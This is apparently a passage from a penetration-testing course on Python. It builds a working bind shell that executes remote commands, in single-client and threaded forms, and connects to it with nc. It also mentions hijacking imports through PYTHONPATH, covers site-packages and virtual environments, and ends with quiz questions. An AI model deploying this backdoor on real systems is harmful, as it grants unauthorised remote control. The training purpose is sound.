A bind shell is at its core reasonably simple. It is a process that binds to an address and port on the host machine and then listens for incoming connections to the socket. When a connection is made, the bind shell will - repeatedly - listen for bytes being sent to it and treat them as raw commands to be executed on the system in a subprocess. Once it has received all bytes in chunks of some size, it will run the command on the host system and send back the output. A very naive implementation of such a bind shell is this:

#### A Simple Bind Shell

```python
import socket
import subprocess
import click

def run_cmd(cmd):
    output = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    return output.stdout

@click.command()
@click.option('--port', '-p', default=4444)
def main(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', port))
    s.listen(4)
    client_socket, address = s.accept()

    while True:
        chunks = []
        chunk = client_socket.recv(2048)
        chunks.append(chunk)
        while len(chunk) != 0 and chr(chunk[-1]) != '\n':
            chunk = client_socket.recv(2048)
            chunks.append(chunk)
        cmd = (b''.join(chunks)).decode()[:-1]

        if cmd.lower() == 'exit':
            client_socket.close()
            break

        output = run_cmd(cmd)
        client_socket.sendall(output)

if __name__ == '__main__':
    main()
```

Given that we will be sending this to our client, we will improve on code quality and make it more reliable. Nevertheless, first, let us analyze it.

The code consists of two functions so far: a wrapper function for executing commands on the system and one main function that contains all the logic thrown into one place. This is less than ideal. The main function sets up a socket, binds it to `0.0.0.0` (i.e., all available interfaces) and the desired port. It is then configured to allow at most four unaccepted connections before it starts refusing connections anymore - the `listen` function configures this. The socket then accepts new incoming connections. This is a so-call `blocking call`, which means the code will halt at this line of code and wait for a connection to be made. When a connection is established, the `accept` call returns two things that we store in the variables `client_socket` and `address`.

Many things happen in the while loop, so let us break it down into smaller pieces. First, these are our goals:

-   receive all of the incoming bytes from the connected client (our attacker machine),
-   convert the incoming bytes to a `cmd` string,
-   close down the connection if `cmd` is "exit",
-   otherwise execute the command locally and send back the output

Notice that we remove the last byte of the `cmd` string. This is a newline character stemming from hitting enter when typing the command.

When we run this script on our target machine, we can use `nc` on our attacker machine to connect to the bind shell and gain remote code execution:

#### Starting the Bind Shell

```text
C:\Users\Birb\Desktop\python> python bindshell.py --port 4444
```

#### Connecting to the Bind Shell

	nc 10.10.10.10 4444 -nv

```text
(UNKNOWN) [10.10.10.10] 4444 (?) open

whoami
localnest\birb

hostname
LOCALNEST

dir 
Volume in drive C has no label.
 Volume Serial Number is 966B-6E6A

 Directory of C:\Users\Birb\Desktop\python

20-03-2021  21:22    <DIR>          .
20-03-2021  21:22    <DIR>          ..
20-03-2021  21:22               929 bindshell.py
               1 File(s)            929 bytes
               2 Dir(s)  518.099.636.224 bytes free
exit
```

The downside of the current implementation is that once we disconnect, the bind shell process stops. One way to fix this is to introduce `threads` and have the command execution part of the code run in a thread. This would allow us to create a new thread every time a machine connects to the shell, and then we would only have to stop the extra thread when the shell exits. Threads, in general, is a vast and complex topic, and Python has its quirks too. To keep a very long and complicated story short and straightforward, threads let us run different code pieces `concurrently`, similarly to how humans multitask. Note that concurrently is not the same as parallel. In our example, this means that while one thread is busy doing work for our connected client, another thread (the primary one) is ready to accept a new incoming connection. Once another connection is made, these two connected clients can execute code on the victim machine using the same bind shell.

By simply extracting the code that handles command execution to its function, it is possible to make the bind shell first listen for a new connection, spawn a thread for that connection that handles command execution, and finally start over listening to new incoming connections.

#### Supporting multiple connections

```python
import socket
import subprocess
import click
from threading import Thread

def run_cmd(cmd):
    output = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    return output.stdout

def handle_input(client_socket):
    while True:
        chunks = []
        chunk = client_socket.recv(2048)
        chunks.append(chunk)
        while len(chunk) != 0 and chr(chunk[-1]) != '\n':
            chunk = client_socket.recv(2048)
            chunks.append(chunk)
        cmd = (b''.join(chunks)).decode()[:-1]

        if cmd.lower() == 'exit':
            client_socket.close()
            break

        output = run_cmd(cmd)
        client_socket.sendall(output)

@click.command()
@click.option('--port', '-p', default=4444)
def main(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', port))
    s.listen(4)

    while True:
        client_socket, _ = s.accept()
        t = Thread(target=handle_input, args=(client_socket, ))
        t.start()

if __name__ == '__main__':
    main()
```

As we can see, we have added a `handle_input` function that accepts a `client_socket` as a parameter. When we create a new `Thread` object, setting the `target` (function to run) and the input parameters as a tuple, we can start this thread and let it run in the background. In addition, a `from threading import Thread` was added at the top. Also, pay close attention to the `args` in the `Thread` constructor. This is a tuple with just one value. To differentiate between single value tuples and "scope parentheses", e.g. `('Hello ' + 'world').upper()` which will have `upper()` called on the concatenated string and not just "world", the syntax for single value tuples is `(val1, )`. For two value tuples, it is `(val1, val2)` and so forth. Furthermore, yes, that is a comma and then nothing for single value tuples. Confusing? Perhaps. Just remember that `(5)` is the same as `5` because the parentheses are used for grouping, so we would need some way to differentiate between syntactic grouping and a tuple type.

## Managing Libraries in Python (Continued)

* * * * *

At this point, we have used multiple packages in our projects and even installed third-party packages. These packages physically exist in a predetermined location so that the Python interpreter can locate the packages when we try to import them or elements from inside of them. The default location is the `site-packages` directory. This is true for Windows systems, however on Debian and Debian-based systems such as Kali, Parrot, and Ubuntu, the external libraries are located inside a `dist-packages` location. However, the principle is the same.

The default `site-packages`/`dist-packages` locations are the following:

-   Windows 10: `PYTHON_INSTALL_DIR\Lib\site-packages`:

```text
C:\Program Files\Python38\Lib\site-packages
```

-   Linux: `/usr/lib/PYTHON_VERSION/dist-packages/`:

```text
/usr/lib/python3/dist-packages
```

The reason why packages are located inside a `dist-packages` rather than a `site-packages` directory on Debian-based systems stems from how Debian-based systems handle packages installed with the package manager (`apt`). However, for simplicity's sake, we will use the common name of `site-packages` going forward. If we take a look inside this directory, we will see many packages available for Python. A package in all its simplicity is just a folder with at least an `__init__.py` file inside of it and optionally (although nearly always) other python files and nested folder structures.

* * * * *

### Directories and Search Paths
----------------------------

Instead of producing a fully functional script for scraping words off a website, we decided to write the script as an API. We could package the script together with an `__init__.py` file (even an empty one is fine) and place the package inside the site-packages directory. Python already knows to check this location when searching for packages. This is not always practical. However, we can tell Python to look in a different directory before searching through the site-packages directory by specifying the `PYTHONPATH` environment variable. As we can see below, without having set a `PYTHONPATH` environment variable, the search path includes only the standard directories:

#### Inspecting the Default Search Path

	python3

```text
Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import sys
>>> sys.path
['', '/usr/lib/python39.zip', '/usr/lib/python3.9', '/usr/lib/python3.9/lib-dynload', '/usr/local/lib/python3.9/dist-packages', '/usr/lib/python3/dist-packages', '/usr/lib/python3.9/dist-packages']

>>>
```

Now let's specify a `PYTHONPATH` environment variable and see how it affects the search path:

#### Inspecting the default search path

	PYTHONPATH=/tmp/ python3

```text
Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import sys
>>> sys.path
['', '/tmp/', '/usr/lib/python39.zip', '/usr/lib/python3.9', '/usr/lib/python3.9/lib-dynload', '/usr/local/lib/python3.9/dist-packages', '/usr/lib/python3/dist-packages', '/usr/lib/python3.9/dist-packages']

>>>
```

Since we set the `PYTHONPATH` to the root directory, this has been prepended to the search path. This means two things: first of all, the packages that exist at the `/tmp/` location can now be imported and used in the project or IDLE, and secondly, it means we can highjack other packages, changing the behavior. The latter point is a bonus if we can control the `PYTHONPATH` of a system to include our malicious package. We will mainly use the search path to specify where to find our APIs in everyday development scenarios.

Suppose we wanted to have the packages installed in a specific folder. For example, we wanted to keep all packages related to us inside some `/var/www/packages/` directory. In that case, we can have pip install the package and store the content inside this folder with the `--target` flag, like so:

#### Installing Python Modules at Target Location

	python3 -m pip install --target /var/www/packages/ requests

```text
Collecting requests
  Using cached requests-2.25.1-py2.py3-none-any.whl (61 kB)
Collecting urllib3<1.27,>=1.21.1
  Downloading urllib3-1.26.4-py2.py3-none-any.whl (153 kB)
     |████████████████████████████████| 153 kB 8.1 MB/s
...SNIP...
```

* * * * *

### Virtual Environments
--------------------

So far, we have looked at installing packages onto the local machine, making packages available to all scripts in our system. If we, for one reason or the other, need to use one specific version of a package for one project and another version of the same package for another project, we will face problems. One solution for this kind of isolation of projects is using `virtual environments` or `venv` for short. The `venv` module allows us to create virtual environments for our projects, consisting of a folder structure for the project environment itself, a copy of the Python binary and files to configure our shell to work with this specific environment. Let us take a look at some examples.

First of all, we will create a virtual environment called `academy`.

#### Preparing the Virtual Environment

	python3 -m venv academy

Next up, we can source the `activate` script located in `academy/bin/`. This configures our shell by setting up the required environment variables so that when we, for example, run `pip install requests`, we will be using the Python binary that was copied as part of creating the virtual environment, like so:

#### Sourcing the venv and installing a package

	source academy/bin/activate
	pip install requests

```text
Collecting requests
  Using cached requests-2.25.1-py2.py3-none-any.whl (61 kB)
Collecting idna<3,>=2.5
...SNIP...
Successfully installed certifi-2020.12.5 chardet-4.0.0 idna-2.10 requests-2.25.1 urllib3-1.26.4
```

Notice the `(academy)` prefix after sourcing the `activate` script. This indicates that our terminal is configured to run commands for that particular virtual environment.

For penetration testing, it can be advisable to use virtual environments so that projects and packages related to those projects are kept separate. This will ensure that when we know that a project works as is, it will not break in the future because, for example, an external package was updated when working on another project.

* * * * *

### In Closing
----------

There are many ways to achieve the same goal. We have looked at some of them, and they will get us very far; however, there are better tools and solutions for larger or more permanent projects. Say we developed a custom `C2` (`Command & Control`) in Python and needed a reliable and separate environment to host the server in. Virtual environments will likely work fine, but an alternative is to use container software such as `Docker` or even a fully isolated Virtual Machine. For larger software projects in Python, virtual environments might be pleasing for parts of the way. Additionally, package- and environment management software such as [Conda](https://docs.conda.io/en/latest/) will allow greater control of the project, especially when collaborating with others. These technologies and methodologies are worthy of their own modules.

* * * * *

### Exercises
---------

For the exercises in this section, please find below the relevant code blocks.

#### Question 1

```python
foo = set()

for i in range(42):
    foo.add('Cake')

foo.add('Hello')
foo.add('World')
```

#### Question 2

```python
x_coordinate = (42,)
```

#### Questions

>How long is foo?

>The type of foo from question 1 is <class 'set'>. What is the type of x_coordinate?

>What is the environment variable called which lets us define a search path for external libraries?